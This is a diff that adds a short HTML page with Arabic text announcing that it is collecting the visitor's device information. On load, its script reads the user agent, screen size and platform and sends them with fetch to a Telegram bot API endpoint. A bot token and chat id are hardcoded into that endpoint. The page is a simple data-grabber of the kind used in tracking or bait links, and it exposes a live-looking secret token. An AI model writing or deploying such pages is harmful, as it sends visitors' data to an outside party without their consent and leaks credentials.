@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gather Device Info</title>
+</head>
+<body>
+    <h1>جاري جمع معلومات جهازك...</h1>
+
+    <script>
+        // جمع معلومات الجهاز الأساسية
+        function getDeviceInfo() {
+            return {
+                userAgent: navigator.userAgent,
+                screenWidth: window.screen.width,
+                screenHeight: window.screen.height,
+                platform: navigator.platform
+            };
+        }
+
+        // إرسال المعلومات إلى البوت باستخدام طلب POST
+        function sendDeviceInfoToBot(deviceInfo) {
+            const botApiUrl = "https://api.telegram.org/bot6604522716:AAFDrWCrOLf8k5lRDp5TyI1VbL9kcMPuwR4/sendMessage";
+            const chatId = "1854384004";  // استبدل بـ chat_id الخاص بالمستخدم
+
+            const message = `
+                نوع الجهاز: ${deviceInfo.userAgent}\n
+                حجم الشاشة: ${deviceInfo.screenWidth}x${deviceInfo.screenHeight}\n
+                نظام التشغيل: ${deviceInfo.platform}
+            `;
+
+            fetch(botApiUrl, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log("Data sent to bot:", data);
+            })
+            .catch(error => {
+                console.error("Error:", error);
+            });
+        }
+
+        // جمع المعلومات وإرسالها
+        const deviceInfo = getDeviceInfo();
+        sendDeviceInfoToBot(deviceInfo);
+    </script>
+</body>
+</html>
